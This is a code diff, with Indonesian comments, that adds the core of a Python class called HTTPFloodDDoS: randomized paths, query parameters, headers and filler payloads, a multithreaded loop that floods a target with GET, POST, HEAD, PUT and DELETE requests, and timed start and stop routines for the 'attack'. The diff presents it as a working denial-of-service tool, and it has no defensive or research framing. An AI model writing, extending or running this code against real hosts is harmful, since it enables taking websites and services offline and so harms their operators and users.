@@ -6281,6 +6281,124 @@ class HTTPFloodDDoS:
             "Waterstones/5.0.0",
             "Blackwell's/5.0.",
         ]
+def generate_random_path(self):
+        # Generate random path untuk membuat request lebih bervariasi
+        if not self.paths:
+            # Default paths jika tidak ada yang diset
+            return random.choice([
+                "/", "/index.html", "/home", "/login", "/dashboard", 
+                "/search", "/about", "/contact", "/products", "/news"
+            ])
+        return random.choice(self.paths)
+    
+    def generate_random_params(self):
+        # Generate random parameter untuk query string
+        if not self.params:
+            # Default params jika tidak ada yang diset
+            params = {
+                "id": random.randint(1, 1000),
+                "page": random.randint(1, 10),
+                "sort": random.choice(["asc", "desc"]),
+                "filter": random.choice(["new", "popular", "featured"])
+            }
+        else:
+            params = {}
+            for param in self.params:
+                params[param] = random.randint(1, 1000)
+        return params
+    
+    def generate_payload(self):
+        # Generate payload jika diperlukan
+        if self.payload_size > 0:
+            return 'A' * self.payload_size
+        return None
+    
+    def make_request(self):
+        # Fungsi untuk membuat HTTP request
+        while self.running:
+            try:
+                # Pilih user agent acak
+                headers = {
+                    "User-Agent": random.choice(self.user_agents),
+                    "Accept": random.choice([
+                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                        "application/json, text/javascript, */*; q=0.01",
+                        "text/css,*/*;q=0.1"
+                    ]),
+                    "Accept-Language": random.choice([
+                        "en-US,en;q=0.9",
+                        "en-GB,en;q=0.9",
+                        "id-ID,id;q=0.9,en;q=0.8"
+                    ]),
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": random.choice(["keep-alive", "close"]),
+                    "Referer": f"http://{self.target}{random.choice(['/', '/home', '/search'])}"
+                }
+                
+                # Pilih metode HTTP acak
+                method = random.choice(self.methods)
+                
+                # Buat URL dengan path dan parameter acak
+                path = self.generate_random_path()
+                params = self.generate_random_params()
+                url = f"http://{self.target}:{self.port}{path}"
+                
+                # Buat payload jika diperlukan
+                payload = self.generate_payload()
+                
+                # Kirim request berdasarkan metode
+                if method == "GET":
+                    response = requests.get(url, headers=headers, params=params, timeout=5)
+                elif method == "POST":
+                    response = requests.post(url, headers=headers, params=params, data=payload, timeout=5)
+                elif method == "HEAD":
+                    response = requests.head(url, headers=headers, params=params, timeout=5)
+                elif method == "PUT":
+                    response = requests.put(url, headers=headers, params=params, data=payload, timeout=5)
+                elif method == "DELETE":
+                    response = requests.delete(url, headers=headers, params=params, timeout=5)
+                
+                # Cetak status response untuk debugging (opsional)
+                # print(f"{method} {url} - {response.status_code}")
+                
+            except Exception as e:
+                # Tangani exception tanpa mencetak error untuk mengurangi output
+                pass
+    
+    def start_attack(self, num_threads):
+        # Metode untuk memulai serangan
+        self.running = True
+        print(f"[*] Starting attack with {num_threads} threads...")
+        
+        # Gunakan ThreadPoolExecutor untuk manajemen thread yang lebih baik
+        self.executor = ThreadPoolExecutor(max_workers=num_threads)
+        
+        # Submit task untuk setiap thread
+        for _ in range(num_threads):
+            self.executor.submit(self.make_request)
+        
+        # Hitung durasi serangan
+        start_time = time.time()
+        end_time = start_time + self.duration
+        
+        # Tunggu hingga durasi selesai
+        while time.time() < end_time:
+            time.sleep(1)
+            remaining = int(end_time - time.time())
+            if remaining > 0:
+                print(f"[*] Attack in progress... {remaining} seconds remaining")
+        
+        # Hentikan serangan
+        self.stop_attack()
+        print("[*] Attack completed!")
+    
+    def stop_attack(self):
+        # Metode untuk menghentikan serangan
+        self.running = False
+        if self.executor:
+            self.executor.shutdown(wait=False)
+            self.executor = None
+
 def main():
     parser = argparse.ArgumentParser(description='HTTP Flood DDoS Tool')
     parser.add_argument('--target', required=True, help='Target URL/IP')
